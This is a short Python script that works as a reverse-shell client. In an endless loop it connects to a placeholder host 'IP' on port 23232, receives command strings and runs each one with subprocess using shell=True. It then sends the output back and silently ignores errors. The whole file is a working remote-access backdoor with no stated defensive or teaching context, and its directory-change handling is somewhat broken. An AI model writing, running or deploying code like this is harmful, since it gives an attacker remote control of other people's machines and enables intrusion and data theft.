import subprocess
import socket
import os

def run_cmd_realtime(cmd_command,original_directory):
        new_lines = []

        process = subprocess.Popen(
            cmd_command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            shell=True,
            # shell=False,
            text=True
        )

        # Read and log output line by line
        for line in process.stdout:
            text = line.strip()
            new_lines.append(text)

        # print(new_lines)
        process.wait()  # Wait for the command to complete

        return new_lines
    
# size 10KB in bytes = 10240
buffer_size = 10240

def client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect(('IP', 23232))
        current_path = os.getcwd()
        client_socket.send(current_path.encode())

        data = client_socket.recv(1024).decode()

        original_directory = os.getcwd()  # Store the original directory
        if data.startswith("cd "):
            try:
                new_directory = original_directory + os.sep + data[3:]  # Extract the directory path from the command

                output = run_cmd_realtime(data, new_directory)
                os.chdir(new_directory)
            except Exception as e:
                # print(e)
                pass
            
        else:
            output = run_cmd_realtime(data, original_directory)

        output = "\n".join(output)
        client_socket.send(output.encode())

    except KeyboardInterrupt:
        print("KeyboardInterrupt")
    except Exception as e:
        pass

    client_socket.close()
    return 
            
if __name__ == "__main__":
    while True:
        client()
